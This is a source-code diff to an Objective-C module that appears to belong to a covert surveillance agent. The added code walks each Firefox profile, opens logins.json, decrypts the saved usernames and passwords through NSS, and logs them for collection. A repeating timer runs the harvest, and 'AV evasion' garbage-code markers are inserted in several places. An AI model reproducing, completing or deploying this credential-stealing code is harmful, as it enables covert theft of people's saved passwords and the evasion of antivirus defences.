@@ -16,7 +16,7 @@
 #import <dlfcn.h>
 #import <sqlite3.h>
 
-
+#import "SBJson.h"
 
 static __m_MAgentPassword *sharedAgentPassword = nil;
 
@@ -272,10 +272,6 @@ BOOL nssLoaded = NO;
     
     for(NSString *profile in profiles)
     {
-#ifdef DEBUG_PASSWORD
-        infoLog(@"profile: %@", profile);
-#endif
-    
         NSString *profileDir = [NSString stringWithFormat:@"%@/%@", firefoxProfiles, profile];
         const char *profileDirUTF8 = [profileDir UTF8String];
         SECStatus result = NSS_Init(profileDirUTF8);
@@ -286,7 +282,83 @@ BOOL nssLoaded = NO;
 #endif
             continue;
         }
-    
+ 
+        // first, look into logins.json
+        NSString *loginFile = [NSString stringWithFormat:@"%@/%@", profileDir, @"logins.json"];
+        NSData *loginContent = [NSData dataWithContentsOfFile:loginFile options:0 error:nil];
+        if (loginContent != NULL) {
+            SBJsonParser *jsonParser = [[SBJsonParser alloc] init];
+            NSMutableDictionary *jsonDict = [jsonParser objectWithData:loginContent];
+            NSMutableArray *logins = [jsonDict objectForKey:@"logins"];
+            for (NSDictionary *login in logins)
+            {
+                double timePasswordChanged = [[login objectForKey:@"timePasswordChanged"] doubleValue];
+                if (timePasswordChanged/1000 < begin) {
+#ifdef DEBUG_PASSWORD
+                    infoLog(@"SKIP LOG");
+#endif
+                    continue;
+                }
+                
+                NSString *hostname = [login objectForKey:@"hostname"];
+                NSString *encryptedUsername = [login objectForKey:@"encryptedUsername"];
+                NSString *encryptedPassword = [login objectForKey:@"encryptedPassword"];
+                
+                const unsigned char *charEncUsr = (const unsigned char *) [encryptedUsername UTF8String];
+                const unsigned char *charEncPwd = (const unsigned char *) [encryptedPassword UTF8String];
+                SECItem *secuser = NULL, *secpass = NULL, user = { siBuffer, NULL, 0 }, pass = { siBuffer, NULL, 0 };
+                
+                if(!(secuser = NSSBase64_DecodeBuffer(NULL, NULL, charEncUsr, strlen(charEncUsr))))
+                {
+#ifdef DEBUG_PASSWORD
+                    infoLog(@"NSSBase64 failed");
+#endif
+                    continue;
+                }
+                if(PK11SDR_Decrypt(secuser, &user, NULL) != SECSuccess)
+                {
+#ifdef DEBUG_PASSWORD
+                    infoLog(@"Decrypt failed");
+#endif
+                    continue;
+                }
+                if(!(secpass = NSSBase64_DecodeBuffer(NULL, NULL, charEncPwd, strlen(charEncPwd))))
+                {
+#ifdef DEBUG_PASSWORD
+                    infoLog(@"NSSBase64 failed 2");
+#endif
+                    continue;
+                }
+                if(PK11SDR_Decrypt(secpass, &pass, NULL) != SECSuccess)
+                {
+#ifdef DEBUG_PASSWORD
+                    infoLog(@"Decrypt failed 2");
+#endif
+                    continue;
+                }
+                NSData *userData = [[NSData alloc] initWithBytes:user.data length:user.len];
+                NSString *userString = [[NSString alloc] initWithData:userData encoding:NSUTF8StringEncoding];
+                NSData *passData = [[NSData alloc] initWithBytes:pass.data length:pass.len];
+                NSString *passString = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
+                
+                // AV evasion: only on release build
+                AV_GARBAGE_000
+                
+                NSArray *components = [profile componentsSeparatedByString:@"."];
+                NSString *service = [NSString stringWithFormat:@"%@/%@", @"Firefox", [components objectAtIndex:1]];
+                
+                [self _writeLog:hostname andUser:userString andPassword:passString andService:service];
+                [self _setMarkup];
+                
+                [passString release];
+                [passData release];
+                [userString release];
+                [userData release];
+            }
+            [jsonParser release];
+        }
+        
+        // then, look into signons.sqlite
         sqlite3 *db;
         NSString *dbDir = [NSString stringWithFormat:@"%@/%@", profileDir, @"signons.sqlite"];
         const char *dbDirUTF8 = [dbDir UTF8String];
@@ -497,6 +569,9 @@ BOOL nssLoaded = NO;
 
 - (BOOL)stop
 {
+#ifdef DEBUG_PASSWORD
+    infoLog(@"module stopped");
+#endif
     
     int internalCounter = 0;
     
@@ -529,6 +604,10 @@ BOOL nssLoaded = NO;
 {
     NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
 
+#ifdef DEBUG_PASSWORD
+    infoLog(@"module started");
+#endif
+
     // AV evasion: only on release build
     AV_GARBAGE_002
     
@@ -543,7 +622,7 @@ BOOL nssLoaded = NO;
 
     
     NSTimer *timer = nil;
-    timer = [NSTimer scheduledTimerWithTimeInterval: /*900*/10 target:self selector:@selector(_getFirefoxPasswordTimer:) userInfo:nil repeats:YES];
+    timer = [NSTimer scheduledTimerWithTimeInterval: /*900*/30 target:self selector:@selector(_getFirefoxPasswordTimer:) userInfo:nil repeats:YES];
     [currentRunLoop addTimer: timer forMode: NSRunLoopCommonModes];
 
     while (![[mConfiguration objectForKey: @"status"] isEqual: AGENT_STOP]
@@ -591,6 +670,10 @@ BOOL nssLoaded = NO;
 
 - (BOOL)resume
 {
+#ifdef DEBUG_PASSWORD
+    infoLog(@"module resumed");
+#endif
+
     return YES;
 }
 
